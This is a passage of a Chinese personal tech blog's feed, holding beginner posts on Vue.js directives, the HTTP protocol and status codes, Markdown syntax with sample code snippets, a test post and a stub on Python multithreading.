class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;vue&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;div&gt;&#123;&#123;mes&#125;&#125;--&#123;&#123;age&#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;ul v-show=&quot;flag&quot; &gt;&lt;!-- v-show表示display属性表示控件是否显示--&gt;</span><br><span class="line">&lt;div&gt;v-for遍历数组元素&lt;/div&gt;</span><br><span class="line">&lt;li v-for=&quot;(v,i) in lists&quot;&gt;&#123;&#123; v &#125;&#125;--&#123;&#123; i &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;div&gt;遍历k vue&lt;/div&gt;</span><br><span class="line">&lt;li v-for=&quot;(v,key) in arr&quot;&gt;&#123;&#123; v &#125;&#125;--&#123;&#123; key &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;div&gt;遍历数组列表元素&lt;/div&gt;</span><br><span class="line">&lt;li v-for=&quot;(v,i) in arrlist&quot;&gt;&#123;&#123; v &#125;&#125;--&#123;&#123; i &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;li v-for=&quot;(v,i) in arrlist&quot;&gt;&#123;&#123; v.name &#125;&#125;--&#123;&#123; v.id &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;button v-on:click=&quot;clike2&quot;&gt;点击2&lt;/button&gt;&lt;!--点击按钮2 age=25 flag=true（控件显示）显示呜呜呜--&gt;</span><br><span class="line">&lt;button  v-on:click=&quot;clike1&quot;&gt;点击1&lt;/button&gt;&lt;!--点击按钮1 age=21 flag=false（控件消失） 显示哈哈哈--&gt;</span><br><span class="line">&lt;p v-if=&quot;age==19&quot;&gt;嘿嘿嘿&lt;/p&gt; </span><br><span class="line">&lt;p v-else-if=&quot;age==21&quot;&gt;哈哈哈&lt;/p&gt;</span><br><span class="line">&lt;p v-else&gt;呜呜呜&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">//实例化一个Vue对象</span><br><span class="line">new Vue(&#123;</span><br><span class="line">el: &quot;#root&quot;, </span><br><span class="line">data:&#123;</span><br><span class="line">mes:&quot;hello&quot;, //显示内容</span><br><span class="line">flag:true,  </span><br><span class="line">age:19,//初始化年龄为19</span><br><span class="line">lists: [&#x27;Jake&#x27;,&#x27;Boy&#x27;,&#x27;Alies&#x27;],</span><br><span class="line">arr:&#123;name:&quot;aa&quot;,id:0001,name:&quot;bb&quot;,id:0002&#125;,</span><br><span class="line">arrlist:[&#123;name:&quot;cccc&quot;,id:00003&#125;,&#123;name:&quot;dddd&quot;,id:00005&#125;,&#123;name:&quot;ffff&quot;,id:00004&#125;]</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">clike1:function () &#123;</span><br><span class="line">this.age=21;</span><br><span class="line">this.mes=&quot;看我&quot;;</span><br><span class="line">this.flag=false;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* body... */</span><br><span class="line">&#125;,</span><br><span class="line">clike2:function()&#123;</span><br><span class="line">this.mes=&quot;再看我&quot;;</span><br><span class="line">this.flag=true;</span><br><span class="line">this.age=25;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><p>Vue框架常用参数含义</p><ul><li>el：Element,就是节点</li><li>data：存放属性的经过后台响应返回H5显示 这些值改变前台随之改变</li><li> methods：存放函数的地方</li><li> filters： 过滤器（比如服务器上代表性别是0和1,在浏览器我们看到的是男女,这就需要我们用过滤器来实现。）</li></ul><hr><p>上面代码主要是Vue的基本指令遍历数组、遍历对象和if-else的基本使用，具体看注释。</p><h6 id="还有很多用多了自然会用，不用刻意去记一些单词"><a href="#还有很多用多了自然会用，不用刻意去记一些单词" class="headerlink" title="还有很多用多了自然会用，不用刻意去记一些单词"></a>还有很多用多了自然会用，不用刻意去记一些单词</h6>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Vue的来源&quot;&gt;&lt;a href=&quot;#Vue的来源&quot; class=&quot;headerlink&quot; title=&quot;Vue的来源&quot;&gt;&lt;/a&gt;Vue的来源&lt;/h2&gt;&lt;p&gt;Vue  是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>浅谈HTTP</title>
    <link href="https://www.doublekai.com/2018/10/25/%C7%B3%CC%B8HTTP/"/>
    <id>https://www.doublekai.com/2018/10/25/%C7%B3%CC%B8HTTP/</id>
    <published>2018-10-24T16:00:00.000Z</published>
    <updated>2018-10-26T04:24:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h3><blockquote><p>网络模型一般是指 OSI 七层参考模型和 TCP/IP 五层参考模型。（也有分为四层的，物理和数据链路为一层<br>大致参考下图！<br><img src="https://github.com/doublekai/user/blob/master/xiyi.png?raw=true" alt="image"></p></blockquote><blockquote><p> 我们现在常用的是TCP/IP模型又称为TCP/IP协议族，每一层分别有很多协议。而计算机之间的通信要通过这些被别人定义好的协议才能互相访问。</p></blockquote><h4 id="各部分及功能"><a href="#各部分及功能" class="headerlink" title="各部分及功能"></a>各部分及功能</h4><blockquote><p>1、应用层：针对你特定应用的协议<br>2、表示层：设备固定的数据格式和网络标准数据格式之间的转化<br>3、会话层：通信管理，负责建立和单开通信连接，管理传输层 以下分层<br>4、传输层：管理两个节点之间的数据传递。负责可靠传输<br>5、网络层：地址管理和路由选择<br>6、数据链路层：互联设备之间传送和识别数据帧<br>7、物理层：界定连接器和网线之间的规格</p></blockquote><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote><p>超文本传输协议（HTTP）是一种为分布式的，协作的，超媒体信息系统，它是面向应用层的协议。</p></blockquote><h4 id="总体操作"><a href="#总体操作" class="headerlink" title="总体操作"></a>总体操作</h4><blockquote><p>HTTP 协议是一种请求/响应型的协议。 客户端给服务器发送请求的格式是一个请求方法(request method)，URI，协议版本号，然后紧接着一个包含请求修饰符(modifiers)，客户端信息，和可能的消息主体的类 MIME(MIME-like)消息。服务器对请求端发送响应的格式 是以一个状态行(status line)，其后跟随一个包含服务器信息、实体元信息和可能的实体主体 内容的类 MIME(MIME-like)的消息。其中状态行(status line)包含消息的协议版本号和一 个成功或错误码。<br><img src="//upload-images.jianshu.io/upload_images/2964446-5a35e17f298a48e1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2" alt="enter description here"></p></blockquote><h4 id="常见协议参数"><a href="#常见协议参数" class="headerlink" title="常见协议参数"></a>常见协议参数</h4><h5 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h5><blockquote><p>http_URL = “http:” “//“ host [ “:” port ] [ abs_path [ “?” query ]]<br>port不指明默认为80</p></blockquote><h5 id="协议版本号"><a href="#协议版本号" class="headerlink" title="协议版本号"></a>协议版本号</h5><blockquote><p>HTTP 使用一个<code>&lt;major&gt;.&lt;minor&gt;</code>数字模式来指明协议的版本号。（具体请参考《HTTP协议》）</p></blockquote><h5 id="请求（Request）"><a href="#请求（Request）" class="headerlink" title="请求（Request）"></a>请求（Request）</h5><blockquote><p>一个请求消息是从客户端到服务器端的，在消息首行里包含方法，资源指示符，协议版本。<br>Request = Request-Line ; Section 5.1 *(( general-header ; Section 4.5|request-header ; Section 5.3| entity-header ) CRLF) ; Section 7.1CRLF[ message-body ] ; Section 4.3</p></blockquote><h5 id="请求（Response）"><a href="#请求（Response）" class="headerlink" title="请求（Response）"></a>请求（Response）</h5><blockquote><p>接收和解析一个请求消息后，服务器发出一个 HTTP 响应消息。<br>response =Status-Line*(( general-header)|response-header|entity-header)CRLF）|CRLF[ message-body ]</p></blockquote><h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><blockquote><p>-1xx :报告的   -请求被接收到，继续处理<br>-2xx :成功 (accepted)的动作 。    -被成功地接收(received).<br>-3xx :重发    -为了完成请求必须采取进一步的动作。<br>-4xx :客户端出错        - 请求包括错的语法或不能被满足。<br>-5xx :服务器出错  -服务器无法完成显然有效的请求。<br>常见状态码</p><blockquote><p>200 OK                        //客户端请求成功<br>400 Bad Request               //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden                 //服务器收到请求，但是拒绝提供服务<br>404 Not Found                 //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error     //服务器发生不可预期的错误<br>503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p></blockquote></blockquote><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><blockquote><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。<br>GET     请求指定的页面信息，并返回实体主体。<br>HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>PUT     从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE      请求服务器删除指定的页面。<br>CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>OPTIONS     允许客户端查看服务器的性能。<br>TRACE     回显服务器收到的请求，主要用于测试或诊断。</p></blockquote><h3 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h3><blockquote><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p></blockquote><h4 id="以下是-HTTP-请求-响应的步骤："><a href="#以下是-HTTP-请求-响应的步骤：" class="headerlink" title="以下是 HTTP 请求/响应的步骤："></a>以下是 HTTP 请求/响应的步骤：</h4><blockquote><p>1、客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn./">http://www.oakcms.cn。</a></p></blockquote><blockquote><p>2、发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p></blockquote><blockquote><p>3、服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p></blockquote><blockquote><p>4、释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p></blockquote><blockquote><p>5、客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p></blockquote><blockquote><p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p></blockquote><blockquote><p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p></blockquote><blockquote><p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p></blockquote><blockquote><p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p></blockquote><blockquote><p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p></blockquote><blockquote><p>5、释放 TCP连接;</p></blockquote><blockquote><p>6、浏览器将该 html 文本并显示内容;<br>具体参考<a href="https://www.cnblogs.com/ranyonsue/p/5984001.html">enter description here</a><br>和《HTTP协议》。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;网络模型&quot;&gt;&lt;a href=&quot;#网络模型&quot; class=&quot;headerlink&quot; title=&quot;网络模型&quot;&gt;&lt;/a&gt;网络模型&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;网络模型一般是指 OSI 七层参考模型和 TCP/IP 五层参考模型。（也有分为四层的，物理和数据</summary>
      
    
    
    
    
    <category term="网络" scheme="https://www.doublekai.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>如何利用Markdown写文章</title>
    <link href="https://www.doublekai.com/2018/07/16/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Markdown%E5%86%99%E6%96%87%E7%AB%A0/"/>
    <id>https://www.doublekai.com/2018/07/16/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Markdown%E5%86%99%E6%96%87%E7%AB%A0/</id>
    <published>2018-07-16T10:06:00.000Z</published>
    <updated>2018-07-19T13:02:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Markdown语法说明"><a href="#Markdown语法说明" class="headerlink" title="Markdown语法说明"></a>Markdown语法说明</h1><blockquote><p>首先来个h2标题就叫做Markdown语法说明<br>在给标题下面定义好ul列表作为目录<br>然后是一个h6副标题和一个&gt;引用</p></blockquote><h2 id="简单的标题"><a href="#简单的标题" class="headerlink" title="简单的标题"></a>简单的标题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">##  h2</span><br></pre></td></tr></table></figure><blockquote><p>h1 == #    （后面加入一个制表符或空格）<br>h2 == ##<br>…… </p></blockquote><p>接下来看一段文字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[link](https://www.cnblogs.com/doublekai &quot;title&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>   link代表文字 （）包含链接和title</p></blockquote><p><a href="https://www.cnblogs.com/doublekai" title="博客园">点击我,能跳转到Doublekai的blog</a></p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>这里是正常的内容<br>接下来是加了 &gt;</p><blockquote><p>  看这就是引用</p><blockquote><p> 我是二级引用</p><blockquote><p>我是三级引用</p><blockquote><p>   我是n层引用</p></blockquote></blockquote></blockquote></blockquote><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>插入图片的格式就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](图片链接 &quot;optional title&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>   Alt text：图片的Alt标签，用来描述图片的关键词，可以不写。最初的本意是当图片因为某种原因不能被显示时而出现的替代文字，后来又被用于SEO，可以方便搜索引擎根据Alt text里面的关键词搜索到图片。 图片链接：可以是图片的本地地址或者是网址。”optional title”：鼠标悬置于图片上会出现的标题文字，可以不写。</p></blockquote><hr><p><img src="/images/wechat.png" alt="image" title="图片"></p><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h2><blockquote><p>  插入代码用三个 ` 来表示<br>接下来是一段定义结构体的代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//因为这段时间专升本在学数据结构所以就拿来做实验了</span><br><span class="line">#include &quot;stdio&quot; //代码光亮不错</span><br><span class="line">#define maxlen 100</span><br><span class="line">typedef struct&#123;   //看来对各种语言关键字都懂啊！</span><br><span class="line">    ElemType data[maxlen];</span><br><span class="line">    int listlen;</span><br><span class="line">    </span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>   上面是一段数据结构代码 关键字都识别<br>    再来看一下 python</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re </span><br><span class="line">for i in rang(0,10):</span><br><span class="line">    print i</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>   再来一段html可以看到基本上对语言识别度很好。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        在加个脚本语言</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        console.log(&#x27;hello,word&#x27;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>   下面是整个页面的md</p></blockquote></blockquote><p><img src="/images/t1.png" alt="image"><br><img src="/images/t2.png" alt="image"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Markdown语法说明&quot;&gt;&lt;a href=&quot;#Markdown语法说明&quot; class=&quot;headerlink&quot; title=&quot;Markdown语法说明&quot;&gt;&lt;/a&gt;Markdown语法说明&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;首先来个h2标题就叫做Markdo</summary>
      
    
    
    
    
    <category term="文章" scheme="https://www.doublekai.com/tags/%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>测试</title>
    <link href="https://www.doublekai.com/2018/07/14/%E6%B5%8B%E8%AF%95/"/>
    <id>https://www.doublekai.com/2018/07/14/%E6%B5%8B%E8%AF%95/</id>
    <published>2018-07-14T03:58:01.000Z</published>
    <updated>2018-07-15T10:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="大标题"><a href="#大标题" class="headerlink" title="大标题"></a>大标题</h3><p>测试内容时间为：12：04</p><hr><p><code>printf(&quot;    hello,word&quot;)</code>  ;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;大标题&quot;&gt;&lt;a href=&quot;#大标题&quot; class=&quot;headerlink&quot; title=&quot;大标题&quot;&gt;&lt;/a&gt;大标题&lt;/h3&gt;&lt;p&gt;测试内容时间为：12：04&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;printf(&amp;quot;    hello,word&amp;quot;)</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python 多线程</title>
    <link href="https://www.doublekai.com/2018/07/14/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>https://www.doublekai.com/2018/07/14/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B/</id>
    <published>2018-07-14T03:58:01.000Z</published>
    <updated>2021-06-21T15:23:25.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是多线程和多进程？"><a href="#什么是多线程和多进程？" class="headerlink" title="什么是多线程和多进程？"></a>什么是多线程和多进程？</h3><p><img src="/images/thread.png" alt="image"></p><ul><li>根据上图可以看出来多线程</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;什么是多线程和多进程？&quot;&gt;&lt;a href=&quot;#什么是多线程和多进程？&quot; class=&quot;headerlink&quot; title=&quot;什么是多线程和多进程？&quot;&gt;&lt;/a&gt;什么是多线程和多进程？&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/thread.png&quot; alt=</summary>
      
    
    
    
    
  </entry>
  
</feed>
